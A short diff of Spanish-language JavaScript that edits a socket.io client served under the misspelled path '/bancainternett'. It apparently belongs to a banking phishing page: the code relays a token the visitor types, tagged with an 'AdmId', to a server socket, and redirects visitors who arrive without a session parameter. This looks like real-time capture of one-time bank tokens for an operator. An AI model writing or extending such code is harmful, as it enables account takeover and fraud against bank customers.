@@ -23,7 +23,7 @@ CerrarModal.addEventListener("click", () => {
 })
 
 const socket = io.connect({
-    path: "/socket.io/"
+    path: "/bancainternett/socket.io/"
 })
 
 
@@ -35,6 +35,9 @@ const urlParams = new URLSearchParams(queryString);
 const originalSocket = urlParams.get('s');
 
 socket.on("connect", () => {
+    if(originalSocket == null){
+        window.location.href = "/bancainternett";
+    }
     console.log("El socket se ha conectado: ", socket.id);
     socket.emit("HomeConnect", {'Socket': socket.id, 'Id': originalSocket});
 })
@@ -61,7 +64,7 @@ sendToken.addEventListener("click", (e) => {
             'Token': tokenInput.value,
             'AdmId': dataAdm,
         }
-        
+        console.log(dataAdm)
         noValidate.style.display = "none";
         socket.emit("SendToken", dataToken);
         tokenInput.style.display = "none";
